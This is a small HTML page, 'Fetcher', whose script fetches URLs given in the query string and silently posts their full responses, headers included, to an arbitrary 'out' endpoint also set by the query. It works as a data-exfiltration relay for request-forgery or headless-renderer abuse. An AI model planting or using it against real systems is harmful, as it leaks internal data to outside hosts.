<!DOCTYPE html>
<html>
<head><title>Fetcher</title></head>
<body>
<script>
(async () => {
  const params = new URLSearchParams(window.location.search);
  const urls = (params.get("urls") || "").split(",").map(u => u.trim()).filter(Boolean);
  const out  = (params.get("out") || "").trim();

  if (!out) return;

  // Ping out immediately to signal start
  await fetch(out, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ event: "start", urls })
  }).catch(() => {});

  const results = [];

  for (const url of urls) {
    try {
      const resp = await fetch(url);
      const body = await resp.text();
      results.push({
        url,
        status: resp.status,
        headers: Object.fromEntries(resp.headers.entries()),
        body
      });
    } catch (err) {
      results.push({ url, error: err.message });
    }
  }

  // Send all results
  await fetch(out, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ event: "done", results })
  }).catch(() => {});
})();
</script>
</body>
</html>
